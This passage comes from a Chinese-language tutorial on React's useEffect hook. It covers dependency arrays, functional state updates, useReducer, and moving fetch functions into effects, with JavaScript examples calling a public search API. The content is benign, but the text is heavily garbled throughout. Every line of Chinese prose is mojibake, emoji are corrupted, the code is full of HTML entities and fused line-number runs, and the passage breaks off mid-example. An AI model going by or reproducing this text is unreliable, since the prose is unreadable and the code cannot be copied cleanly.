12345useEffect(() =&gt; &#123; const id = setInterval(() =&gt; &#123; setCount(count + 1); &#125;, 1000); return () =&gt; clearInterval(id);&#125;, [count]); ç°åœ¨ä¾èµ–æ•°ç»„æ­£ç¡®äº†ã€‚è™½ç„¶å®ƒå¯èƒ½ä¸æ˜¯å¤ªç†æƒ³ä½†ç¡®å®è§£å†³äº†ä¸Šé¢çš„é—®é¢˜ã€‚ç°åœ¨ï¼Œæ¯æ¬¡countä¿®æ”¹éƒ½ä¼šé‡æ–°è¿è¡Œeffectï¼Œå¹¶ä¸”å®šæ—¶å™¨ä¸­çš„setCount(count + 1)ä¼šæ­£ç¡®å¼•ç”¨æŸæ¬¡æ¸²æŸ“ä¸­çš„ countå€¼ï¼š 123456789101112131415161718192021222324252627// First render, state is 0function Counter() &#123; // ... useEffect( // Effect from first render () =&gt; &#123; const id = setInterval(() =&gt; &#123; setCount(0 + 1); // setCount(count + 1) &#125;, 1000); return () =&gt; clearInterval(id); &#125;, [0] // [count] ); // ...&#125;// Second render, state is 1function Counter() &#123; // ... useEffect( // Effect from second render () =&gt; &#123; const id = setInterval(() =&gt; &#123; setCount(1 + 1); // setCount(count + 1) &#125;, 1000); return () =&gt; clearInterval(id); &#125;, [1] // [count] ); // ...&#125; è¿™èƒ½è§£å†³é—®é¢˜ä½†æ˜¯æˆ‘ä»¬çš„å®šæ—¶å™¨ä¼šåœ¨æ¯ä¸€æ¬¡countæ”¹å˜åæ¸…é™¤å’Œé‡æ–°è®¾å®šã€‚è¿™åº”è¯¥ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼š (ä¾èµ–å‘ç”Ÿäº†å˜æ›´ï¼Œæ‰€ä»¥ä¼šé‡æ–°è¿è¡Œeffectã€‚) ç¬¬äºŒç§ç­–ç•¥æ˜¯ä¿®æ”¹effectå†…éƒ¨çš„ä»£ç ä»¥ç¡®ä¿å®ƒåŒ…å«çš„å€¼åªä¼šåœ¨éœ€è¦çš„æ—¶å€™å‘ç”Ÿå˜æ›´ã€‚æˆ‘ä»¬ä¸æƒ³å‘ŠçŸ¥é”™è¯¯çš„ä¾èµ– - æˆ‘ä»¬åªæ˜¯ä¿®æ”¹effectä½¿å¾—ä¾èµ–æ›´å°‘ã€‚ è®©æˆ‘ä»¬æ¥çœ‹ä¸€äº›ç§»é™¤ä¾èµ–çš„å¸¸ç”¨æŠ€å·§ã€‚ è®©Effectsè‡ªç»™è‡ªè¶³æˆ‘ä»¬æƒ³å»æ‰effectçš„countä¾èµ–ã€‚ 12345useEffect(() =&gt; &#123; const id = setInterval(() =&gt; &#123; setCount(count + 1); &#125;, 1000); return () =&gt; clearInterval(id);&#125;, [count]); ä¸ºäº†å®ç°è¿™ä¸ªç›®çš„ï¼Œæˆ‘ä»¬éœ€è¦é—®è‡ªå·±ä¸€ä¸ªé—®é¢˜ï¼šæˆ‘ä»¬ä¸ºä»€ä¹ˆè¦ç”¨countï¼Ÿå¯ä»¥çœ‹åˆ°æˆ‘ä»¬åªåœ¨setCountè°ƒç”¨ä¸­ç”¨åˆ°äº†countã€‚åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œæˆ‘ä»¬å…¶å®å¹¶ä¸éœ€è¦åœ¨effectä¸­ä½¿ç”¨countã€‚å½“æˆ‘ä»¬æƒ³è¦æ ¹æ®å‰ä¸€ä¸ªçŠ¶æ€æ›´æ–°çŠ¶æ€çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨setStateçš„å‡½æ•°å½¢å¼ï¼š 12345useEffect(() =&gt; &#123; const id = setInterval(() =&gt; &#123; setCount(c =&gt; c + 1); &#125;, 1000); return () =&gt; clearInterval(id);&#125;, []); æˆ‘å–œæ¬¢æŠŠç±»ä¼¼è¿™ç§æƒ…å†µç§°ä¸ºâ€œé”™è¯¯çš„ä¾èµ–â€ã€‚æ˜¯çš„ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨effectä¸­å†™äº†setCount(count + 1)æ‰€ä»¥countæ˜¯ä¸€ä¸ªå¿…éœ€çš„ä¾èµ–ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬çœŸæ­£æƒ³è¦çš„æ˜¯æŠŠcountè½¬æ¢ä¸ºcount+1ï¼Œç„¶åè¿”å›ç»™Reactã€‚å¯æ˜¯Reactå…¶å®å·²ç»çŸ¥é“å½“å‰çš„countã€‚æˆ‘ä»¬éœ€è¦å‘ŠçŸ¥Reactçš„ä»…ä»…æ˜¯å»é€’å¢çŠ¶æ€ - ä¸ç®¡å®ƒç°åœ¨å…·ä½“æ˜¯ä»€ä¹ˆå€¼ã€‚ è¿™æ­£æ˜¯setCount(c =&gt; c + 1)åšçš„äº‹æƒ…ã€‚ä½ å¯ä»¥è®¤ä¸ºå®ƒæ˜¯åœ¨ç»™Reactâ€œå‘é€æŒ‡ä»¤â€å‘ŠçŸ¥å¦‚ä½•æ›´æ–°çŠ¶æ€ã€‚è¿™ç§â€œæ›´æ–°å½¢å¼â€åœ¨å…¶ä»–æƒ…å†µä¸‹ä¹Ÿæœ‰å¸®åŠ©ï¼Œæ¯”å¦‚ä½ éœ€è¦æ‰¹é‡æ›´æ–°ã€‚ æ³¨æ„æˆ‘ä»¬åšåˆ°äº†ç§»é™¤ä¾èµ–ï¼Œå¹¶ä¸”æ²¡æœ‰æ’’è°ã€‚æˆ‘ä»¬çš„effectä¸å†è¯»å–æ¸²æŸ“ä¸­çš„countå€¼ã€‚ (ä¾èµ–æ²¡æœ‰å˜ï¼Œæ‰€ä»¥ä¸ä¼šå†æ¬¡è¿è¡Œeffectã€‚) ä½ å¯ä»¥è‡ªå·± è¯•è¯•ã€‚ å°½ç®¡effectåªè¿è¡Œäº†ä¸€æ¬¡ï¼Œç¬¬ä¸€æ¬¡æ¸²æŸ“ä¸­çš„å®šæ—¶å™¨å›è°ƒå‡½æ•°å¯ä»¥å®Œç¾åœ°åœ¨æ¯æ¬¡è§¦å‘çš„æ—¶å€™ç»™Reactå‘é€c =&gt; c + 1æ›´æ–°æŒ‡ä»¤ã€‚å®ƒä¸å†éœ€è¦çŸ¥é“å½“å‰çš„countå€¼ã€‚å› ä¸ºReactå·²ç»çŸ¥é“äº†ã€‚ å‡½æ•°å¼æ›´æ–° å’Œ Google Docsè¿˜è®°å¾—æˆ‘ä»¬è¯´è¿‡åŒæ­¥æ‰æ˜¯ç†è§£effectsçš„å¿ƒæ™ºæ¨¡å‹å—ï¼ŸåŒæ­¥çš„ä¸€ä¸ªæœ‰è¶£åœ°æ–¹åœ¨äºä½ é€šå¸¸æƒ³è¦æŠŠåŒæ­¥çš„â€œä¿¡æ¯â€å’ŒçŠ¶æ€è§£è€¦ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå½“ä½ åœ¨Google Docsç¼–è¾‘æ–‡æ¡£çš„æ—¶å€™ï¼ŒGoogleå¹¶ä¸ä¼šæŠŠæ•´ç¯‡æ–‡ç« å‘é€ç»™æœåŠ¡å™¨ã€‚é‚£æ ·åšä¼šéå¸¸ä½æ•ˆã€‚ç›¸åçš„ï¼Œå®ƒåªæ˜¯æŠŠä½ çš„ä¿®æ”¹ä»¥ä¸€ç§å½¢å¼å‘é€ç»™æœåŠ¡ç«¯ã€‚ è™½ç„¶æˆ‘ä»¬effectçš„æƒ…å†µä¸å°½ç›¸åŒï¼Œä½†å¯ä»¥åº”ç”¨ç±»ä¼¼çš„æ€æƒ³ã€‚åªåœ¨effectsä¸­ä¼ é€’æœ€å°çš„ä¿¡æ¯ä¼šå¾ˆæœ‰å¸®åŠ©ã€‚ç±»ä¼¼äºsetCount(c =&gt; c + 1)è¿™æ ·çš„æ›´æ–°å½¢å¼æ¯”setCount(count + 1)ä¼ é€’äº†æ›´å°‘çš„ä¿¡æ¯ï¼Œå› ä¸ºå®ƒä¸å†è¢«å½“å‰çš„countå€¼â€œæ±¡æŸ“â€ã€‚å®ƒåªæ˜¯è¡¨è¾¾äº†ä¸€ç§è¡Œä¸ºï¼ˆâ€œé€’å¢â€ï¼‰ã€‚â€œThinking in Reactâ€ä¹Ÿè®¨è®ºäº†å¦‚ä½•æ‰¾åˆ°æœ€å°çŠ¶æ€ã€‚åŸåˆ™æ˜¯ç±»ä¼¼çš„ï¼Œåªä¸è¿‡ç°åœ¨å…³æ³¨çš„æ˜¯å¦‚ä½•æ›´æ–°ã€‚ è¡¨è¾¾æ„å›¾ï¼ˆè€Œä¸æ˜¯ç»“æœï¼‰å’ŒGoogle Docså¦‚ä½•å¤„ç†å…±åŒç¼–è¾‘å¼‚æ›²åŒå·¥ã€‚è™½ç„¶è¿™ä¸ªç±»æ¯”ç•¥å¾®å»¶ä¼¸äº†ä¸€ç‚¹ï¼Œå‡½æ•°å¼æ›´æ–°åœ¨Reactä¸­æ‰®æ¼”äº†ç±»ä¼¼çš„è§’è‰²ã€‚å®ƒä»¬ç¡®ä¿èƒ½ä»¥æ‰¹é‡åœ°å’Œå¯é¢„æµ‹çš„æ–¹å¼æ¥å¤„ç†å„ç§æºå¤´ï¼ˆäº‹ä»¶å¤„ç†å‡½æ•°ï¼Œeffectä¸­çš„è®¢é˜…ï¼Œç­‰ç­‰ï¼‰çš„çŠ¶æ€æ›´æ–°ã€‚ ç„¶è€Œï¼Œå³ä½¿æ˜¯setCount(c =&gt; c + 1)ä¹Ÿå¹¶ä¸å®Œç¾ã€‚å®ƒçœ‹èµ·æ¥æœ‰ç‚¹æ€ªï¼Œå¹¶ä¸”éå¸¸å—é™äºå®ƒèƒ½åšçš„äº‹ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ä¸¤ä¸ªäº’ç›¸ä¾èµ–çš„çŠ¶æ€ï¼Œæˆ–è€…æˆ‘ä»¬æƒ³åŸºäºä¸€ä¸ªpropæ¥è®¡ç®—ä¸‹ä¸€æ¬¡çš„stateï¼Œå®ƒå¹¶ä¸èƒ½åšåˆ°ã€‚å¹¸è¿çš„æ˜¯ï¼Œ setCount(c =&gt; c + 1)æœ‰ä¸€ä¸ªæ›´å¼ºå¤§çš„å§å¦¹æ¨¡å¼ï¼Œå®ƒçš„åå­—å«useReducerã€‚ è§£è€¦æ¥è‡ªActionsçš„æ›´æ–°æˆ‘ä»¬æ¥ä¿®æ”¹ä¸Šé¢çš„ä¾‹å­è®©å®ƒåŒ…å«ä¸¤ä¸ªçŠ¶æ€ï¼šcount å’Œ stepã€‚æˆ‘ä»¬çš„å®šæ—¶å™¨ä¼šæ¯æ¬¡åœ¨countä¸Šå¢åŠ ä¸€ä¸ªstepå€¼ï¼š 12345678910111213141516function Counter() &#123; const [count, setCount] = useState(0); const [step, setStep] = useState(1); useEffect(() =&gt; &#123; const id = setInterval(() =&gt; &#123; setCount(c =&gt; c + step); &#125;, 1000); return () =&gt; clearInterval(id); &#125;, [step]); return ( &lt;&gt; &lt;h1&gt;&#123;count&#125;&lt;/h1&gt; &lt;input value=&#123;step&#125; onChange=&#123;e =&gt; setStep(Number(e.target.value))&#125; /&gt; &lt;/&gt; );&#125; (è¿™é‡Œæ˜¯demo.) æ³¨æ„æˆ‘ä»¬æ²¡æœ‰æ’’è°ã€‚æ—¢ç„¶æˆ‘ä»¬åœ¨effecté‡Œä½¿ç”¨äº†stepï¼Œæˆ‘ä»¬å°±æŠŠå®ƒåŠ åˆ°ä¾èµ–é‡Œã€‚æ‰€ä»¥è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä»£ç èƒ½è¿è¡Œæ­£ç¡®ã€‚ è¿™ä¸ªä¾‹å­ç›®å‰çš„è¡Œä¸ºæ˜¯ä¿®æ”¹stepä¼šé‡å¯å®šæ—¶å™¨ - å› ä¸ºå®ƒæ˜¯ä¾èµ–é¡¹ä¹‹ä¸€ã€‚åœ¨å¤§å¤šæ•°åœºæ™¯ä¸‹ï¼Œè¿™æ­£æ˜¯ä½ æ‰€éœ€è¦çš„ã€‚æ¸…é™¤ä¸Šä¸€æ¬¡çš„effectç„¶åé‡æ–°è¿è¡Œæ–°çš„effectå¹¶æ²¡æœ‰ä»»ä½•é”™ã€‚é™¤éæˆ‘ä»¬æœ‰å¾ˆå¥½çš„ç†ç”±ï¼Œæˆ‘ä»¬ä¸åº”è¯¥æ”¹å˜è¿™ä¸ªé»˜è®¤è¡Œä¸ºã€‚ ä¸è¿‡ï¼Œå‡å¦‚æˆ‘ä»¬ä¸æƒ³åœ¨stepæ”¹å˜åé‡å¯å®šæ—¶å™¨ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•ä»effectä¸­ç§»é™¤å¯¹stepçš„ä¾èµ–å‘¢ï¼Ÿ å½“ä½ æƒ³æ›´æ–°ä¸€ä¸ªçŠ¶æ€ï¼Œå¹¶ä¸”è¿™ä¸ªçŠ¶æ€æ›´æ–°ä¾èµ–äºå¦ä¸€ä¸ªçŠ¶æ€çš„å€¼æ—¶ï¼Œä½ å¯èƒ½éœ€è¦ç”¨useReducerå»æ›¿æ¢å®ƒä»¬ã€‚ å½“ä½ å†™ç±»ä¼¼setSomething(something =&gt; ...)è¿™ç§ä»£ç çš„æ—¶å€™ï¼Œä¹Ÿè®¸å°±æ˜¯è€ƒè™‘ä½¿ç”¨reducerçš„å¥‘æœºã€‚reducerå¯ä»¥è®©ä½ æŠŠç»„ä»¶å†…å‘ç”Ÿäº†ä»€ä¹ˆ(actions)å’ŒçŠ¶æ€å¦‚ä½•å“åº”å¹¶æ›´æ–°åˆ†å¼€è¡¨è¿°ã€‚ æˆ‘ä»¬ç”¨ä¸€ä¸ªdispatchä¾èµ–å»æ›¿æ¢effectçš„stepä¾èµ–ï¼š 1234567const [state, dispatch] = useReducer(reducer, initialState);const &#123; count, step &#125; = state;useEffect(() =&gt; &#123; const id = setInterval(() =&gt; &#123; dispatch(&#123; type: 'tick' &#125;); // Instead of setCount(c =&gt; c + step); &#125;, 1000); return () =&gt; clearInterval(id);&#125;, [dispatch]); (æŸ¥çœ‹ demoã€‚) ä½ å¯èƒ½ä¼šé—®ï¼šâ€œè¿™æ€ä¹ˆå°±æ›´å¥½äº†ï¼Ÿâ€ç­”æ¡ˆæ˜¯Reactä¼šä¿è¯dispatchåœ¨ç»„ä»¶çš„å£°æ˜å‘¨æœŸå†…ä¿æŒä¸å˜ã€‚æ‰€ä»¥ä¸Šé¢ä¾‹å­ä¸­ä¸å†éœ€è¦é‡æ–°è®¢é˜…å®šæ—¶å™¨ã€‚ æˆ‘ä»¬è§£å†³äº†é—®é¢˜! ï¼ˆä½ å¯ä»¥ä»ä¾èµ–ä¸­å»é™¤dispatch, setState, å’ŒuseRefåŒ…è£¹çš„å€¼å› ä¸ºReactä¼šç¡®ä¿å®ƒä»¬æ˜¯é™æ€çš„ã€‚ä¸è¿‡ä½ è®¾ç½®äº†å®ƒä»¬ä½œä¸ºä¾èµ–ä¹Ÿæ²¡ä»€ä¹ˆé—®é¢˜ã€‚ï¼‰ ç›¸æ¯”äºç›´æ¥åœ¨effecté‡Œé¢è¯»å–çŠ¶æ€ï¼Œå®ƒdispatchäº†ä¸€ä¸ªactionæ¥æè¿°å‘ç”Ÿäº†ä»€ä¹ˆã€‚è¿™ä½¿å¾—æˆ‘ä»¬çš„effectå’ŒstepçŠ¶æ€è§£è€¦ã€‚æˆ‘ä»¬çš„effectä¸å†å…³å¿ƒæ€ä¹ˆæ›´æ–°çŠ¶æ€ï¼Œå®ƒåªè´Ÿè´£å‘Šè¯‰æˆ‘ä»¬å‘ç”Ÿäº†ä»€ä¹ˆã€‚æ›´æ–°çš„é€»è¾‘å…¨éƒ½äº¤ç”±reducerå»ç»Ÿä¸€å¤„ç†: 12345678910111213const initialState = &#123; count: 0, step: 1,&#125;;function reducer(state, action) &#123; const &#123; count, step &#125; = state; if (action.type === 'tick') &#123; return &#123; count: count + step, step &#125;; &#125; else if (action.type === 'step') &#123; return &#123; count, step: action.step &#125;; &#125; else &#123; throw new Error(); &#125;&#125; (è¿™é‡Œæ˜¯demo å¦‚æœä½ ä¹‹å‰é”™è¿‡äº†ã€‚) ä¸ºä»€ä¹ˆuseReduceræ˜¯Hooksçš„ä½œå¼Šæ¨¡å¼æˆ‘ä»¬å·²ç»å­¦ä¹ åˆ°å¦‚ä½•ç§»é™¤effectçš„ä¾èµ–ï¼Œä¸ç®¡çŠ¶æ€æ›´æ–°æ˜¯ä¾èµ–ä¸Šä¸€ä¸ªçŠ¶æ€è¿˜æ˜¯ä¾èµ–å¦ä¸€ä¸ªçŠ¶æ€ã€‚ä½†å‡å¦‚æˆ‘ä»¬éœ€è¦ä¾èµ–*props*å»è®¡ç®—ä¸‹ä¸€ä¸ªçŠ¶æ€å‘¢ï¼Ÿä¸¾ä¸ªä¾‹å­ï¼Œä¹Ÿè®¸æˆ‘ä»¬çš„APIæ˜¯``ã€‚ç¡®å®šçš„æ˜¯ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ²¡æ³•é¿å…ä¾èµ–props.step ã€‚æ˜¯å—ï¼Ÿ å®é™…ä¸Šï¼Œ æˆ‘ä»¬å¯ä»¥é¿å…ï¼æˆ‘ä»¬å¯ä»¥æŠŠreducerå‡½æ•°æ”¾åˆ°ç»„ä»¶å†…å»è¯»å–propsï¼š 123456789101112131415161718function Counter(&#123; step &#125;) &#123; const [count, dispatch] = useReducer(reducer, 0); function reducer(state, action) &#123; if (action.type === 'tick') &#123; return state + step; &#125; else &#123; throw new Error(); &#125; &#125; useEffect(() =&gt; &#123; const id = setInterval(() =&gt; &#123; dispatch(&#123; type: 'tick' &#125;); &#125;, 1000); return () =&gt; clearInterval(id); &#125;, [dispatch]); return &lt;h1&gt;&#123;count&#125;&lt;/h1&gt;;&#125; è¿™ç§æ¨¡å¼ä¼šä½¿ä¸€äº›ä¼˜åŒ–å¤±æ•ˆï¼Œæ‰€ä»¥ä½ åº”è¯¥é¿å…æ»¥ç”¨å®ƒï¼Œä¸è¿‡å¦‚æœä½ éœ€è¦ä½ å®Œå…¨å¯ä»¥åœ¨reduceré‡Œé¢è®¿é—®propsã€‚ï¼ˆè¿™é‡Œæ˜¯demoã€‚ï¼‰ å³ä½¿æ˜¯åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒReactä¹Ÿä¿è¯dispatchåœ¨æ¯æ¬¡æ¸²æŸ“ä¸­éƒ½æ˜¯ä¸€æ ·çš„ã€‚ æ‰€ä»¥ä½ å¯ä»¥åœ¨ä¾èµ–ä¸­å»æ‰å®ƒã€‚å®ƒä¸ä¼šå¼•èµ·effectä¸å¿…è¦çš„é‡å¤æ‰§è¡Œã€‚ ä½ å¯èƒ½ä¼šç–‘æƒ‘ï¼šè¿™æ€ä¹ˆå¯èƒ½ï¼Ÿåœ¨ä¹‹å‰æ¸²æŸ“ä¸­è°ƒç”¨çš„reduceræ€ä¹ˆâ€œçŸ¥é“â€æ–°çš„propsï¼Ÿç­”æ¡ˆæ˜¯å½“ä½ dispatchçš„æ—¶å€™ï¼ŒReactåªæ˜¯è®°ä½äº†action - å®ƒä¼šåœ¨ä¸‹ä¸€æ¬¡æ¸²æŸ“ä¸­å†æ¬¡è°ƒç”¨reducerã€‚åœ¨é‚£ä¸ªæ—¶å€™ï¼Œæ–°çš„propså°±å¯ä»¥è¢«è®¿é—®åˆ°ï¼Œè€Œä¸”reducerè°ƒç”¨ä¹Ÿä¸æ˜¯åœ¨effecté‡Œã€‚ è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘å€¾å‘è®¤ä¸ºuseReduceræ˜¯Hooksçš„â€œä½œå¼Šæ¨¡å¼â€ã€‚å®ƒå¯ä»¥æŠŠæ›´æ–°é€»è¾‘å’Œæè¿°å‘ç”Ÿäº†ä»€ä¹ˆåˆ†å¼€ã€‚ç»“æœæ˜¯ï¼Œè¿™å¯ä»¥å¸®åŠ©æˆ‘ç§»é™¤ä¸å¿…éœ€çš„ä¾èµ–ï¼Œé¿å…ä¸å¿…è¦çš„effectè°ƒç”¨ã€‚ æŠŠå‡½æ•°ç§»åˆ°Effectsé‡Œä¸€ä¸ªå…¸å‹çš„è¯¯è§£æ˜¯è®¤ä¸ºå‡½æ•°ä¸åº”è¯¥æˆä¸ºä¾èµ–ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä¸‹é¢çš„ä»£ç çœ‹ä¸Šå»å¯ä»¥è¿è¡Œæ­£å¸¸ï¼š 1234567891011121314function SearchResults() &#123; const [data, setData] = useState(&#123; hits: [] &#125;); async function fetchData() &#123; const result = await axios( 'https://hn.algolia.com/api/v1/search?query=react', ); setData(result.data); &#125; useEffect(() =&gt; &#123; fetchData(); &#125;, []); // Is this okay? // ... (è¿™ä¸ªä¾‹å­ æ”¹ç¼–è‡ªRobin Wieruchè¿™ç¯‡å¾ˆæ£’çš„æ–‡ç«  â€” ç‚¹å‡»æŸ¥çœ‹ï¼) éœ€è¦æ˜ç¡®çš„æ˜¯ï¼Œä¸Šé¢çš„ä»£ç å¯ä»¥æ­£å¸¸å·¥ä½œã€‚ä½†è¿™æ ·åšåœ¨ç»„ä»¶æ—¥æ¸å¤æ‚çš„è¿­ä»£è¿‡ç¨‹ä¸­æˆ‘ä»¬å¾ˆéš¾ç¡®ä¿å®ƒåœ¨å„ç§æƒ…å†µä¸‹è¿˜èƒ½æ­£å¸¸è¿è¡Œã€‚ æƒ³è±¡ä¸€ä¸‹æˆ‘ä»¬çš„ä»£ç åšä¸‹é¢è¿™æ ·çš„åˆ†ç¦»ï¼Œå¹¶ä¸”æ¯ä¸€ä¸ªå‡½æ•°çš„ä½“é‡æ˜¯ç°åœ¨çš„äº”å€ï¼š 123456789101112131415161718function SearchResults() &#123; // Imagine this function is long function getFetchUrl() &#123; return 'https://hn.algolia.com/api/v1/search?query=react'; &#125; // Imagine this function is also long async function fetchData() &#123; const result = await axios(getFetchUrl()); setData(result.data); &#125; useEffect(() =&gt; &#123; fetchData(); &#125;, []); // ...&#125; ç„¶åæˆ‘ä»¬åœ¨æŸäº›å‡½æ•°å†…ä½¿ç”¨äº†æŸäº›stateæˆ–è€…propï¼š 12345678910111213141516171819function SearchResults() &#123; const [query, setQuery] = useState('react'); // Imagine this function is also long function getFetchUrl() &#123; return 'https://hn.algolia.com/api/v1/search?query=' + query; &#125; // Imagine this function is also long async function fetchData() &#123; const result = await axios(getFetchUrl()); setData(result.data); &#125; useEffect(() =&gt; &#123; fetchData(); &#125;, []); // ...&#125; å¦‚æœæˆ‘ä»¬å¿˜è®°å»æ›´æ–°ä½¿ç”¨è¿™äº›å‡½æ•°ï¼ˆå¾ˆå¯èƒ½é€šè¿‡å…¶ä»–å‡½æ•°è°ƒç”¨ï¼‰çš„effectsçš„ä¾èµ–ï¼Œæˆ‘ä»¬çš„effectså°±ä¸ä¼šåŒæ­¥propså’Œstateå¸¦æ¥çš„å˜æ›´ã€‚è¿™å½“ç„¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚ å¹¸è¿çš„æ˜¯ï¼Œå¯¹äºè¿™ä¸ªé—®é¢˜æœ‰ä¸€ä¸ªç®€å•çš„è§£å†³æ–¹æ¡ˆã€‚å¦‚æœæŸäº›å‡½æ•°ä»…åœ¨effectä¸­è°ƒç”¨ï¼Œä½ å¯ä»¥æŠŠå®ƒä»¬çš„å®šä¹‰ç§»åˆ°effectä¸­ï¼š 12345678function SearchResults() &#123; // ... useEffect(() =&gt; &#123; // We moved these functions inside! function getFetchUrl() &#123; return 'https://hn.algolia.com/api/v1/search?query=react'; &#125; async function fetchData() &#123; const result = await axios(getFetchUrl()); setData(result.data); &#125; fetchData(); &#125;, []); // âœ… Deps are OK // ...&#125; (è¿™é‡Œæ˜¯demo.) è¿™ä¹ˆåšæœ‰ä»€ä¹ˆå¥½å¤„å‘¢ï¼Ÿæˆ‘ä»¬ä¸å†éœ€è¦å»è€ƒè™‘è¿™äº›â€œé—´æ¥ä¾èµ–â€ã€‚æˆ‘ä»¬çš„ä¾èµ–æ•°ç»„ä¹Ÿä¸å†æ’’è°ï¼šåœ¨æˆ‘ä»¬çš„effectä¸­ç¡®å®æ²¡æœ‰å†ä½¿ç”¨ç»„ä»¶èŒƒå›´å†…çš„ä»»ä½•ä¸œè¥¿ã€‚ å¦‚æœæˆ‘ä»¬åé¢ä¿®æ”¹ getFetchUrlå»ä½¿ç”¨queryçŠ¶æ€ï¼Œæˆ‘ä»¬æ›´å¯èƒ½ä¼šæ„è¯†åˆ°æˆ‘ä»¬æ­£åœ¨effecté‡Œé¢ç¼–è¾‘å®ƒ - å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æŠŠqueryæ·»åŠ åˆ°effectçš„ä¾èµ–é‡Œï¼š 12345678910111213141516function SearchResults() &#123; const [query, setQuery] = useState('react'); useEffect(() =&gt; &#123; function getFetchUrl() &#123; return 'https://hn.algolia.com/api/v1/search?query=' + query; &#125; async function fetchData() &#123; const result = await axios(getFetchUrl()); setData(result.data); &#125; fetchData(); &#125;, [query]); // âœ… Deps are OK // ...&#125; (è¿™é‡Œæ˜¯demo.) æ·»åŠ è¿™ä¸ªä¾èµ–ï¼Œæˆ‘ä»¬ä¸ä»…ä»…æ˜¯åœ¨â€œå–æ‚¦Reactâ€ã€‚åœ¨queryæ”¹å˜åå»é‡æ–°è¯·æ±‚æ•°æ®æ˜¯åˆç†çš„ã€‚useEffectçš„è®¾è®¡æ„å›¾å°±æ˜¯è¦å¼ºè¿«ä½ å…³æ³¨æ•°æ®æµçš„æ”¹å˜ï¼Œç„¶åå†³å®šæˆ‘ä»¬çš„effectsè¯¥å¦‚ä½•å’Œå®ƒåŒæ­¥ - è€Œä¸æ˜¯å¿½è§†å®ƒç›´åˆ°æˆ‘ä»¬çš„ç”¨æˆ·é‡åˆ°äº†bugã€‚ æ„Ÿè°¢eslint-plugin-react-hooks æ’ä»¶çš„exhaustive-depslintè§„åˆ™ï¼Œå®ƒä¼šåœ¨ä½ ç¼–ç çš„æ—¶å€™å°±åˆ†æeffectså¹¶ä¸”æä¾›å¯èƒ½é—æ¼ä¾èµ–çš„å»ºè®®ã€‚æ¢å¥è¯è¯´ï¼Œæœºå™¨ä¼šå‘Šè¯‰ä½ ç»„ä»¶ä¸­å“ªäº›æ•°æ®æµå˜æ›´æ²¡æœ‰è¢«æ­£ç¡®åœ°å¤„ç†ã€‚ éå¸¸æ£’ã€‚ ä½†æˆ‘ä¸èƒ½æŠŠè¿™ä¸ªå‡½æ•°æ”¾åˆ°Effecté‡Œæœ‰æ—¶å€™ä½ å¯èƒ½ä¸æƒ³æŠŠå‡½æ•°ç§»å…¥effecté‡Œã€‚æ¯”å¦‚ï¼Œç»„ä»¶å†…æœ‰å‡ ä¸ªeffectä½¿ç”¨äº†ç›¸åŒçš„å‡½æ•°ï¼Œä½ ä¸æƒ³åœ¨æ¯ä¸ªeffecté‡Œå¤åˆ¶é»è´´ä¸€éè¿™ä¸ªé€»è¾‘ã€‚ä¹Ÿæˆ–è®¸è¿™ä¸ªå‡½æ•°æ˜¯ä¸€ä¸ªpropã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ä½ åº”è¯¥å¿½ç•¥å¯¹å‡½æ•°çš„ä¾èµ–å—ï¼Ÿæˆ‘ä¸è¿™ä¹ˆè®¤ä¸ºã€‚å†æ¬¡å¼ºè°ƒï¼Œeffectsä¸åº”è¯¥å¯¹å®ƒçš„ä¾èµ–æ’’è°ã€‚é€šå¸¸æˆ‘ä»¬è¿˜æœ‰æ›´å¥½çš„è§£å†³åŠæ³•ã€‚ä¸€ä¸ªå¸¸è§çš„è¯¯è§£æ˜¯ï¼Œâ€œå‡½æ•°ä»æ¥ä¸ä¼šæ”¹å˜â€ã€‚ä½†æ˜¯è¿™ç¯‡æ–‡ç« ä½ è¯»åˆ°ç°åœ¨ï¼Œä½ çŸ¥é“è¿™æ˜¾ç„¶ä¸æ˜¯äº‹å®ã€‚å®é™…ä¸Šï¼Œåœ¨ç»„ä»¶å†…å®šä¹‰çš„å‡½æ•°æ¯ä¸€æ¬¡æ¸²æŸ“éƒ½åœ¨å˜ã€‚ å‡½æ•°æ¯æ¬¡æ¸²æŸ“éƒ½ä¼šæ”¹å˜è¿™ä¸ªäº‹å®æœ¬èº«å°±æ˜¯ä¸ªé—®é¢˜ã€‚ æ¯”å¦‚æœ‰ä¸¤ä¸ªeffectsä¼šè°ƒç”¨ getFetchUrl: 1234567891011121314151617function SearchResults() &#123; function getFetchUrl(query) &#123; return 'https://hn.algolia.com/api/v1/search?query=' + query; &#125; useEffect(() =&gt; &#123; const url = getFetchUrl('react'); // ... Fetch data and do something ... &#125;, []); // ğŸ”´ Missing dep: getFetchUrl useEffect(() =&gt; &#123; const url = getFetchUrl('redux'); // ... Fetch data and do something ... &#125;, []); // ğŸ”´ Missing dep: getFetchUrl // ...&#125; åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä½ å¯èƒ½ä¸æƒ³æŠŠgetFetchUrl ç§»åˆ°effectsä¸­ï¼Œå› ä¸ºä½ æƒ³å¤ç”¨é€»è¾‘ã€‚ å¦ä¸€æ–¹é¢ï¼Œå¦‚æœä½ å¯¹ä¾èµ–å¾ˆâ€œè¯šå®â€ï¼Œä½ å¯èƒ½ä¼šæ‰åˆ°é™·é˜±é‡Œã€‚æˆ‘ä»¬çš„ä¸¤ä¸ªeffectséƒ½ä¾èµ–getFetchUrlï¼Œè€Œå®ƒæ¯æ¬¡æ¸²æŸ“éƒ½ä¸åŒï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ä¾èµ–æ•°ç»„ä¼šå˜å¾—æ— ç”¨ï¼š 1234567891011121314function SearchResults() &#123; // ğŸ”´ 